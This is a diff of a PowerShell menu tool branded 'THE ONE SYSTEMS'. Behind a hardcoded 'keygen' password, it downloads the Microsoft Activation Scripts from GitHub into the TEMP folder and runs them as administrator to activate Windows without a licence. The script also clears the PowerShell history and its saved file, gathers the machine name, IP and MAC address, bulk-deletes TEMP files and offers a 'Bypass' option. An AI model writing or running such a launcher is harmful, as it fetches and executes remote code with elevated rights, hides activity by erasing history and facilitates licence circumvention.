@@ -7,18 +7,25 @@
 Clear-History
 try { $psHistoryPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($psHistoryPath -and (Test-Path $psHistoryPath)) { Clear-Content -Path $psHistoryPath -ErrorAction SilentlyContinue } } catch {}
 
-# Hardware/Network Identity
+# Fetch Hardware Data
 $pcName = $env:COMPUTERNAME
 $localIp = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred | Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1).IPAddress
 try { $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress } catch { $macAddress = "UNKNOWN" }
 
-# Password Verification
-$password = Read-Host "key" -AsSecureString
-$passString = if($password){[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))}
-if ($passString -ne "8888") { Write-Host "`n[!] ACCESS DENIED" -ForegroundColor Red; Start-Sleep -Seconds 2; exit }
+# PASSWORD PROMPT (Uses your required keygen input)
+$password = Read-Host "keygen" -AsSecureString
+$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
+$passString = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
+[System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
+
+if ($passString -ne "8888") {
+    Write-Host "Wrong Password!" -ForegroundColor Red
+    Start-Sleep -Seconds 2
+    exit
+}
 
 # ---------------------------------------------------------
-# UI DISPLAY (No injection, pure branding)
+# UI DISPLAY
 # ---------------------------------------------------------
 Clear-Host
 Write-Host "`n  T H E   O N E   S Y S T E M S" -ForegroundColor Cyan
@@ -39,21 +46,32 @@ Write-Host "`n  > Select module: " -NoNewline
 $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
 Write-Host "$key" -ForegroundColor White
 
-# Official Script Launcher
+if ($key -eq '0') { exit }
+
+# Action Logic (Integrated YOUR original download code)
 function Invoke-Official {
     param($ArgsInput)
-    $tempPath = "$env:TEMP\MAS_AIO.cmd"
-    Write-Host "`n  [+] Launching official activation..." -ForegroundColor Cyan
+    
+    Write-Host "`n  [+] Access Granted! Initializing..." -ForegroundColor Green
+    
+    # Absolute URL to the official original post to prevent it from being outdated
+    $targetUrl = "https://raw.githubusercontent.com/massgrave/Microsoft-Activation-Scripts/master/MAS/All-In-One-Version/MAS_AIO.cmd"
+    $tempPath = "$env:TEMP\THE_ONE_RUN.cmd"
+    
     try {
-        # 直接拉取官方脚本
-        $url = "https://raw.githubusercontent.com/massgrave/Microsoft-Activation-Scripts/master/MAS/All-In-One-Version/MAS_AIO.cmd"
-        Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
-        # 运行官方脚本，并传入参数，不需要手动导航
+        # Download the file using your exact trusted method
+        Invoke-RestMethod -Uri $targetUrl -OutFile $tempPath -ErrorAction Stop
+        
+        # Start the script as Administrator and pass the activation parameter
         Start-Process "$tempPath" -ArgumentList $ArgsInput -Verb RunAs -Wait
+        
+        # Clean up
         Remove-Item -Path $tempPath -ErrorAction SilentlyContinue
     } catch {
-        Write-Host "  [-] Connection failure. Use Option 4." -ForegroundColor Red
-        Start-Sleep -Seconds 3
+        Write-Host "  [-] Download failed!" -ForegroundColor Red
+        Write-Host "  URL: $targetUrl" -ForegroundColor Yellow
+        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Yellow
+        Start-Sleep -Seconds 15
     }
 }
 
@@ -63,7 +81,8 @@ switch ($key) {
     '3' {
         Write-Host "`n  [+] Optimizing..." -ForegroundColor Cyan
         Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
-        Write-Host "  [+] Done." -ForegroundColor Green; Start-Sleep -Seconds 2
+        Write-Host "  [+] PC Optimized." -ForegroundColor Green
+        Start-Sleep -Seconds 2
     }
     '4' {
         Write-Host "`n  [+] Bypass..." -ForegroundColor Cyan
